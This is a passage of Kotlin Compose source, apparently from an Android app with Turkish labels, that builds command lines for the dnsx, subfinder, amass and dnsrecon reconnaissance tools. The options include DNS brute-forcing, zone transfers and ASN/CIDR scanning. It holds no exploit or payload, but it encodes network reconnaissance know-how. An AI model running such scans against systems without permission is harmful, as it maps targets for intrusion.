            ToggleChip("Recon (-recon)", resolveRecon, modifier = Modifier.weight(1.5f)) { resolveRecon = !resolveRecon }
            ToggleChip("A (-a)", resolveA, modifier = Modifier.weight(1f)) { resolveA = !resolveA }
            ToggleChip("AAAA (-aaaa)", resolveAAAA, modifier = Modifier.weight(1f)) { resolveAAAA = !resolveAAAA }
            ToggleChip("CNAME (-cname)", resolveCname, modifier = Modifier.weight(1f)) { resolveCname = !resolveCname }
        }
        Row(modifier = Modifier.fillMaxWidth().padding(top = 4.dp), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            ToggleChip("MX (-mx)", resolveMX, modifier = Modifier.weight(1f)) { resolveMX = !resolveMX }
            ToggleChip("TXT (-txt)", resolveTXT, modifier = Modifier.weight(1f)) { resolveTXT = !resolveTXT }
            ToggleChip("PTR (-ptr)", resolvePTR, modifier = Modifier.weight(1f)) { resolvePTR = !resolvePTR }
            ToggleChip("NS (-ns)", resolveNS, modifier = Modifier.weight(1f)) { resolveNS = !resolveNS }
        }
        Row(modifier = Modifier.fillMaxWidth().padding(top = 4.dp), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            ToggleChip("SOA (-soa)", resolveSOA, modifier = Modifier.weight(1f)) { resolveSOA = !resolveSOA }
            ToggleChip("SRV (-srv)", resolveSRV, modifier = Modifier.weight(1f)) { resolveSRV = !resolveSRV }
            ToggleChip("Zone Transfer (-axfr)", resolveAXFR, modifier = Modifier.weight(1.5f)) { resolveAXFR = !resolveAXFR }
        }

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "FİLTRELER VE ÇÖZÜMLEME AYARLARI", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        ToggleOption(label = "-wc Wildcard Filtreleme (Sahte Subdomainleri Ele)", checked = wildcardFilter, onCheckedChange = { wildcardFilter = it })
        if (wildcardFilter) {
            OutlinedTextField(
                value = wildcardDomain,
                onValueChange = { wildcardDomain = it },
                label = { Text("Wildcard Domain (-wd target.com) - Opsiyonel") },
                modifier = Modifier.fillMaxWidth(),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            Spacer(modifier = Modifier.height(6.dp))
        }
        ToggleOption(label = "-resp Sadece Yanıt Veren Domainleri Listele", checked = respOnly, onCheckedChange = { respOnly = it })
        ToggleOption(label = "-resp-only Sadece Çözümlenen IP/Değerleri Bas", checked = respOnlyValues, onCheckedChange = { respOnlyValues = it })
        ToggleOption(label = "-silent Terminal Bannerlarını Gizle", checked = silent, onCheckedChange = { silent = it })

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "RESOLVERS VE PERFORMANS", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(
                value = customResolvers,
                onValueChange = { customResolvers = it },
                label = { Text("Resolvers (-r res.txt)") },
                modifier = Modifier.weight(1.5f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            OutlinedTextField(
                value = threads,
                onValueChange = { threads = it },
                label = { Text("Threads (-t)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            OutlinedTextField(
                value = rateLimit,
                onValueChange = { rateLimit = it },
                label = { Text("Rate (-rl)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "ÇIKTI FORMATI", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("txt" to "Metin (.txt)", "json" to "JSON (-json)", "none" to "Terminal").forEach { (fmt, lbl) ->
                val isSelected = outputFormat == fmt
                Box(
                    modifier = Modifier
                        .weight(1f)
                        .clip(RoundedCornerShape(6.dp))
                        .background(if (isSelected) CyberGreen.copy(alpha = 0.2f) else SurfaceDark)
                        .border(1.dp, if (isSelected) CyberGreen else BorderDark, RoundedCornerShape(6.dp))
                        .clickable { outputFormat = fmt }
                        .padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) {
                    Text(text = lbl, fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = if (isSelected) CyberGreen else TextSecondary)
                }
            }
        }

        // Live Command Synthesis
        val parts = mutableListOf("dnsx")
        if (target.trim().endsWith(".txt")) {
            parts.addAll(listOf("-l", target.trim()))
        } else {
            parts.addAll(listOf("-d", target.trim()))
        }

        if (wordlist.isNotBlank()) {
            parts.addAll(listOf("-w", wordlist.trim()))
        }

        if (resolveRecon) {
            parts.add("-recon")
        } else {
            if (resolveA) parts.add("-a")
            if (resolveAAAA) parts.add("-aaaa")
            if (resolveCname) parts.add("-cname")
            if (resolveMX) parts.add("-mx")
            if (resolveTXT) parts.add("-txt")
            if (resolvePTR) parts.add("-ptr")
            if (resolveNS) parts.add("-ns")
            if (resolveSOA) parts.add("-soa")
            if (resolveSRV) parts.add("-srv")
            if (resolveAXFR) parts.add("-axfr")
        }

        if (wildcardFilter) parts.add("-wc")
        if (wildcardDomain.isNotBlank()) parts.addAll(listOf("-wd", wildcardDomain.trim()))
        if (respOnlyValues) {
            parts.add("-resp-only")
        } else if (respOnly) {
            parts.add("-resp")
        }

        if (customResolvers.isNotBlank()) {
            parts.addAll(listOf("-r", customResolvers.trim()))
        }

        parts.addAll(listOf("-t", threads.trim(), "-rl", rateLimit.trim()))
        if (silent) parts.add("-silent")

        when (outputFormat) {
            "txt" -> parts.addAll(listOf("-o", "dnsx_results.txt"))
            "json" -> parts.addAll(listOf("-json", "-o", "dnsx_results.json"))
        }

        GeneratedCommandCard(command = parts.joinToString(" "), language = language)
    }
}

// 6. SUBFINDER
@Composable
fun SubfinderBuilder(language: AppLanguage) {
    var domain by remember { mutableStateOf("target.com") }
    var allSources by remember { mutableStateOf(true) }
    var specificSources by remember { mutableStateOf("") }
    var excludeSources by remember { mutableStateOf("") }
    var recursive by remember { mutableStateOf(false) }
    var removeWildcard by remember { mutableStateOf(true) }
    var collectStats by remember { mutableStateOf(false) }
    var customResolvers by remember { mutableStateOf("") }
    var threads by remember { mutableStateOf("50") }
    var timeout by remember { mutableStateOf("30") }
    var rateLimit by remember { mutableStateOf("100") }
    var proxy by remember { mutableStateOf("") }
    var silent by remember { mutableStateOf(false) }
    var outputFormat by remember { mutableStateOf("txt") }

    Column {
        OutlinedTextField(
            value = domain,
            onValueChange = { domain = it },
            label = { Text("Hedef Domain (-d) veya Liste Dosyası (-dL domains.txt)") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
            singleLine = true
        )
        Spacer(modifier = Modifier.height(8.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(
                value = specificSources,
                onValueChange = { specificSources = it },
                label = { Text("Belirli Kaynaklar (-s censys..)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            OutlinedTextField(
                value = excludeSources,
                onValueChange = { excludeSources = it },
                label = { Text("Hariç Tut (-es alienvault..)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "KEŞİF BAYRAKLARI", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        ToggleOption(label = "-all Tüm Pasif Kaynakları Kullan (Derin Keşif)", checked = allSources, onCheckedChange = { allSources = it })
        ToggleOption(label = "-recursive Özyinelemeli Subdomain Keşfi", checked = recursive, onCheckedChange = { recursive = it })
        ToggleOption(label = "-nW Wildcard Subdomainleri Filtrele", checked = removeWildcard, onCheckedChange = { removeWildcard = it })
        ToggleOption(label = "-cs Kaynak Bazlı İstatistikleri Göster", checked = collectStats, onCheckedChange = { collectStats = it })
        ToggleOption(label = "-silent Sade Çıktı (Terminal Bannerlarını Gizle)", checked = silent, onCheckedChange = { silent = it })

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "AĞ VE PERFORMANS AYARLARI", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(
                value = threads,
                onValueChange = { threads = it },
                label = { Text("Threads (-t)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            OutlinedTextField(
                value = timeout,
                onValueChange = { timeout = it },
                label = { Text("Timeout (-timeout)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            OutlinedTextField(
                value = rateLimit,
                onValueChange = { rateLimit = it },
                label = { Text("Rate (-rl)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }
        Spacer(modifier = Modifier.height(6.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(
                value = customResolvers,
                onValueChange = { customResolvers = it },
                label = { Text("Resolvers (-r 1.1.1.1 veya -rL res.txt)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            OutlinedTextField(
                value = proxy,
                onValueChange = { proxy = it },
                label = { Text("Proxy (-proxy http://..)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "ÇIKTI FORMATI", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("txt" to "Metin (.txt)", "json" to "JSON (-oJ)", "none" to "Terminal").forEach { (fmt, lbl) ->
                val isSelected = outputFormat == fmt
                Box(
                    modifier = Modifier
                        .weight(1f)
                        .clip(RoundedCornerShape(6.dp))
                        .background(if (isSelected) CyberGreen.copy(alpha = 0.2f) else SurfaceDark)
                        .border(1.dp, if (isSelected) CyberGreen else BorderDark, RoundedCornerShape(6.dp))
                        .clickable { outputFormat = fmt }
                        .padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) {
                    Text(text = lbl, fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = if (isSelected) CyberGreen else TextSecondary)
                }
            }
        }

        // Live Command Synthesis
        val parts = mutableListOf("subfinder")
        if (domain.trim().endsWith(".txt")) {
            parts.addAll(listOf("-dL", domain.trim()))
        } else {
            parts.addAll(listOf("-d", domain.trim()))
        }

        if (allSources) parts.add("-all")
        if (specificSources.isNotBlank()) parts.addAll(listOf("-s", specificSources.trim()))
        if (excludeSources.isNotBlank()) parts.addAll(listOf("-es", excludeSources.trim()))
        if (recursive) parts.add("-recursive")
        if (removeWildcard) parts.add("-nW")
        if (collectStats) parts.add("-cs")

        if (customResolvers.isNotBlank()) {
            if (customResolvers.trim().endsWith(".txt")) {
                parts.addAll(listOf("-rL", customResolvers.trim()))
            } else {
                parts.addAll(listOf("-r", customResolvers.trim()))
            }
        }

        parts.addAll(listOf("-t", threads.trim(), "-timeout", timeout.trim(), "-rl", rateLimit.trim()))
        if (proxy.isNotBlank()) parts.addAll(listOf("-proxy", proxy.trim()))
        if (silent) parts.add("-silent")

        when (outputFormat) {
            "txt" -> parts.addAll(listOf("-o", "subdomains.txt"))
            "json" -> parts.addAll(listOf("-oJ", "-o", "subdomains.json"))
        }

        GeneratedCommandCard(command = parts.joinToString(" "), language = language)
    }
}

// 7. AMASS
@Composable
fun AmassBuilder(language: AppLanguage) {
    var mode by remember { mutableStateOf("enum") }
    var target by remember { mutableStateOf("target.com") }
    var targetType by remember { mutableStateOf("domain") }
    var scanType by remember { mutableStateOf("passive") }
    var bruteForce by remember { mutableStateOf(false) }
    var wordlist by remember { mutableStateOf("/usr/share/wordlists/subdomains.txt") }
    var minRecursive by remember { mutableStateOf("2") }
    var alterations by remember { mutableStateOf(true) }
    var resolversFile by remember { mutableStateOf("") }
    var maxDnsQueries by remember { mutableStateOf("200") }
    var dbDir by remember { mutableStateOf("") }
    var outputFormat by remember { mutableStateOf("txt") }

    Column {
        Text(text = "ALT KOMUT MODU", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("enum" to "Numaralandırma (enum)", "intel" to "İstihbarat (intel)", "viz" to "Görselleştir (viz)", "track" to "Fark Takip (track)").forEach { (m, lbl) ->
                val isSelected = mode == m
                Box(
                    modifier = Modifier
                        .weight(1f)
                        .clip(RoundedCornerShape(6.dp))
                        .background(if (isSelected) CyberGreen.copy(alpha = 0.2f) else SurfaceDark)
                        .border(1.dp, if (isSelected) CyberGreen else BorderDark, RoundedCornerShape(6.dp))
                        .clickable { mode = m }
                        .padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) {
                    Text(text = lbl, fontSize = 9.sp, fontFamily = FontFamily.Monospace, textAlign = androidx.compose.ui.text.style.TextAlign.Center, color = if (isSelected) CyberGreen else TextSecondary)
                }
            }
        }

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "HEDEF TİPİ", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("domain" to "Domain (-d)", "asn" to "ASN (-asn)", "cidr" to "CIDR (-cidr)", "file" to "Liste (-df)").forEach { (t, lbl) ->
                val isSelected = targetType == t
                Box(
                    modifier = Modifier
                        .weight(1f)
                        .clip(RoundedCornerShape(6.dp))
                        .background(if (isSelected) CyberGreen.copy(alpha = 0.2f) else SurfaceDark)
                        .border(1.dp, if (isSelected) CyberGreen else BorderDark, RoundedCornerShape(6.dp))
                        .clickable { targetType = t }
                        .padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) {
                    Text(text = lbl, fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = if (isSelected) CyberGreen else TextSecondary)
                }
            }
        }
        Spacer(modifier = Modifier.height(6.dp))
        OutlinedTextField(
            value = target,
            onValueChange = { target = it },
            label = { Text("Hedef (örn: target.com / 13335 / 192.168.1.0/24 / domains.txt)") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
            singleLine = true
        )

        if (mode == "enum") {
            Spacer(modifier = Modifier.height(10.dp))
            Text(text = "TARAMA TEKNİĞİ", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
            Spacer(modifier = Modifier.height(4.dp))
            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                listOf("passive" to "Pasif (-passive)", "active" to "Aktif (-active)").forEach { (st, lbl) ->
                    val isSelected = scanType == st
                    Box(
                        modifier = Modifier
                            .weight(1f)
                            .clip(RoundedCornerShape(6.dp))
                            .background(if (isSelected) CyberGreen.copy(alpha = 0.2f) else SurfaceDark)
                            .border(1.dp, if (isSelected) CyberGreen else BorderDark, RoundedCornerShape(6.dp))
                            .clickable { scanType = st }
                            .padding(vertical = 6.dp),
                        contentAlignment = Alignment.Center
                    ) {
                        Text(text = lbl, fontSize = 11.sp, fontFamily = FontFamily.Monospace, color = if (isSelected) CyberGreen else TextSecondary)
                    }
                }
            }

            Spacer(modifier = Modifier.height(10.dp))
            Text(text = "KABA KUVVET VE PERMÜTASYON", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
            Spacer(modifier = Modifier.height(4.dp))
            ToggleOption(label = "-brute DNS Kaba Kuvvet Taraması Yap", checked = bruteForce, onCheckedChange = { bruteForce = it })
            if (bruteForce) {
                OutlinedTextField(
                    value = wordlist,
                    onValueChange = { wordlist = it },
                    label = { Text("Wordlist Yolu (-w)") },
                    modifier = Modifier.fillMaxWidth(),
                    colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                    singleLine = true
                )
                Spacer(modifier = Modifier.height(6.dp))
            }
            ToggleOption(label = "-alterations Alt Alan Adı Permütasyonları Üret", checked = alterations, onCheckedChange = { alterations = it })

            Spacer(modifier = Modifier.height(10.dp))
            Text(text = "AĞ VE DNS AYARLARI", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
            Spacer(modifier = Modifier.height(4.dp))
            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                OutlinedTextField(
                    value = minRecursive,
                    onValueChange = { minRecursive = it },
                    label = { Text("Recursive Derinlik (-min-for-recursive)") },
                    modifier = Modifier.weight(1f),
                    colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                    singleLine = true
                )
                OutlinedTextField(
                    value = maxDnsQueries,
                    onValueChange = { maxDnsQueries = it },
                    label = { Text("Max DNS Sorgu (-max-dns-queries)") },
                    modifier = Modifier.weight(1f),
                    colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                    singleLine = true
                )
            }
            Spacer(modifier = Modifier.height(6.dp))
            OutlinedTextField(
                value = resolversFile,
                onValueChange = { resolversFile = it },
                label = { Text("Özel DNS Sunucuları (-rf resolvers.txt) - Opsiyonel") },
                modifier = Modifier.fillMaxWidth(),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "ÇIKTI VE VERİTABANI", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("txt" to "Metin (-o)", "json" to "JSON (-json)", "none" to "Terminal").forEach { (fmt, lbl) ->
                val isSelected = outputFormat == fmt
                Box(
                    modifier = Modifier
                        .weight(1f)
                        .clip(RoundedCornerShape(6.dp))
                        .background(if (isSelected) CyberGreen.copy(alpha = 0.2f) else SurfaceDark)
                        .border(1.dp, if (isSelected) CyberGreen else BorderDark, RoundedCornerShape(6.dp))
                        .clickable { outputFormat = fmt }
                        .padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) {
                    Text(text = lbl, fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = if (isSelected) CyberGreen else TextSecondary)
                }
            }
        }

        // Live Command Synthesis
        val parts = mutableListOf("amass", mode)
        when (targetType) {
            "asn" -> parts.addAll(listOf("-asn", target.trim()))
            "cidr" -> parts.addAll(listOf("-cidr", target.trim()))
            "file" -> parts.addAll(listOf("-df", target.trim()))
            else -> parts.addAll(listOf("-d", target.trim()))
        }

        if (mode == "enum") {
            if (scanType == "passive") parts.add("-passive") else parts.add("-active")
            if (bruteForce) {
                parts.add("-brute")
                if (wordlist.isNotBlank()) parts.addAll(listOf("-w", wordlist.trim()))
            }
            if (alterations) parts.add("-alterations")
            if (minRecursive.isNotBlank()) parts.addAll(listOf("-min-for-recursive", minRecursive.trim()))
            if (resolversFile.isNotBlank()) parts.addAll(listOf("-rf", resolversFile.trim()))
            if (maxDnsQueries.isNotBlank()) parts.addAll(listOf("-max-dns-queries", maxDnsQueries.trim()))
        }

        if (dbDir.isNotBlank()) parts.addAll(listOf("-dir", dbDir.trim()))

        when (outputFormat) {
            "txt" -> parts.addAll(listOf("-o", "amass_results.txt"))
            "json" -> parts.addAll(listOf("-json", "amass_results.json"))
        }

        GeneratedCommandCard(command = parts.joinToString(" "), language = language)
    }
}
// =============================================================
// PART 2: DNS & WEB DİZİN / FUZZING / KEŞİF (10 ARAÇ)
// =============================================================

// 11. DNSRECON
@Composable
fun DnsreconBuilder(language: AppLanguage) {
    var domain by remember { mutableStateOf("target.com") }
    var scanType by remember { mutableStateOf("std") }
    var wordlist by remember { mutableStateOf("/usr/share/wordlists/dnsrecon/subdomains-top1mil-5000.txt") }
    var ipRange by remember { mutableStateOf("") }
    var nameserver by remember { mutableStateOf("") }
    var threads by remember { mutableStateOf("30") }
    var lifetime by remember { mutableStateOf("3") }

    // Gelişmiş Bayraklar
    var axfrCheck by remember { mutableStateOf(true) }
    var spfLookup by remember { mutableStateOf(false) }
    var googleEnum by remember { mutableStateOf(false) }
    var deepWhois by remember { mutableStateOf(false) }
    var dnssecWalk by remember { mutableStateOf(false) }
    var outputFormat by remember { mutableStateOf("csv") }
    var outputFile by remember { mutableStateOf("dnsrecon_results") }

    Column {
        OutlinedTextField(
            value = domain,
            onValueChange = { domain = it },
            label = { Text("Hedef Alan Adı (-d target.com)") },
            modifier = Modifier.fillMaxWidth(),
            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
            singleLine = true
        )

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "TARAMA TÜRÜ (-t)", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("std" to "Standart (std)", "axfr" to "Zone Transfer (axfr)", "brt" to "Brute-force (brt)", "srv" to "SRV Kayıtları (srv)").forEach { (t, lbl) ->
                val isSelected = scanType == t
                Box(
                    modifier = Modifier
                        .weight(1f)
                        .clip(RoundedCornerShape(6.dp))
                        .background(if (isSelected) CyberGreen.copy(alpha = 0.2f) else SurfaceDark)
                        .border(1.dp, if (isSelected) CyberGreen else BorderDark, RoundedCornerShape(6.dp))
                        .clickable { scanType = t }
                        .padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) {
                    Text(text = lbl, fontSize = 9.5.sp, fontFamily = FontFamily.Monospace, textAlign = androidx.compose.ui.text.style.TextAlign.Center, color = if (isSelected) CyberGreen else TextSecondary)
                }
            }
        }
        Row(modifier = Modifier.fillMaxWidth().padding(top = 4.dp), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("tld" to "TLD Genişletme (tld)", "zonewalk" to "DNSSEC Walk", "bing" to "Bing Arama", "crt" to "crt.sh Sertifika").forEach { (t, lbl) ->
                val isSelected = scanType == t
                Box(
                    modifier = Modifier
                        .weight(1f)
                        .clip(RoundedCornerShape(6.dp))
                        .background(if (isSelected) CyberGreen.copy(alpha = 0.2f) else SurfaceDark)
                        .border(1.dp, if (isSelected) CyberGreen else BorderDark, RoundedCornerShape(6.dp))
                        .clickable { scanType = t }
                        .padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) {
                    Text(text = lbl, fontSize = 9.5.sp, fontFamily = FontFamily.Monospace, textAlign = androidx.compose.ui.text.style.TextAlign.Center, color = if (isSelected) CyberGreen else TextSecondary)
                }
            }
        }

        if (scanType == "brt") {
            Spacer(modifier = Modifier.height(6.dp))
            OutlinedTextField(
                value = wordlist,
                onValueChange = { wordlist = it },
                label = { Text("Alt Alan Kelime Listesi (-D)") },
                modifier = Modifier.fillMaxWidth(),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }

        Spacer(modifier = Modifier.height(6.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(
                value = ipRange,
                onValueChange = { ipRange = it },
                label = { Text("Ters Çözümleme Aralığı (-r CIDR) - Opsiyonel") },
                modifier = Modifier.weight(1.2f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            OutlinedTextField(
                value = nameserver,
                onValueChange = { nameserver = it },
                label = { Text("DNS Sunucusu (-n)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "GELİŞMİŞ NUMARALANDIRMA BAYRAKLARI", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        ToggleOption(label = "-a Standart Taramada AXFR (Zone Transfer) Dene", checked = axfrCheck, onCheckedChange = { axfrCheck = it })
        ToggleOption(label = "-s SPF Kayıtlarındaki IPv4 Bloklarını Ters Çözümle", checked = spfLookup, onCheckedChange = { spfLookup = it })
        ToggleOption(label = "-g Google Arama Motoru Üzerinden Numaralandır", checked = googleEnum, onCheckedChange = { googleEnum = it })
        ToggleOption(label = "-w Derinlemesine Whois ve Keşfedilen Blokları Çözümle", checked = deepWhois, onCheckedChange = { deepWhois = it })
        ToggleOption(label = "-z DNSSEC NSEC Kayıtları Üzerinden Alan Adı Haritala", checked = dnssecWalk, onCheckedChange = { dnssecWalk = it })

        Spacer(modifier = Modifier.height(10.dp))
        Text(text = "PERFORMANS VE ÇIKTI FORMATI", fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = TerminalCyan)
        Spacer(modifier = Modifier.height(4.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(
                value = threads,
                onValueChange = { threads = it },
                label = { Text("Threads (--threads)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
            OutlinedTextField(
                value = lifetime,
                onValueChange = { lifetime = it },
                label = { Text("Timeout sn (--lifetime)") },
                modifier = Modifier.weight(1f),
                colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                singleLine = true
            )
        }
        Spacer(modifier = Modifier.height(6.dp))
        Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
            listOf("csv" to "CSV (--csv)", "json" to "JSON (--json)", "xml" to "XML (--xml)", "none" to "Terminal").forEach { (fmt, lbl) ->
                val isSelected = outputFormat == fmt
                Box(
                    modifier = Modifier
                        .weight(1f)
                        .clip(RoundedCornerShape(6.dp))
                        .background(if (isSelected) CyberGreen.copy(alpha = 0.2f) else SurfaceDark)
                        .border(1.dp, if (isSelected) CyberGreen else BorderDark, RoundedCornerShape(6.dp))
                        .clickable { outputFormat = fmt }
                        .padding(vertical = 6.dp),
                    contentAlignment = Alignment.Center
                ) {
                    Text(text = lbl, fontSize = 10.sp, fontFamily = FontFamily.Monospace, color = if (isSelected) CyberGreen else TextSecondary)
                }
            }
        }

        // Live Command Synthesis
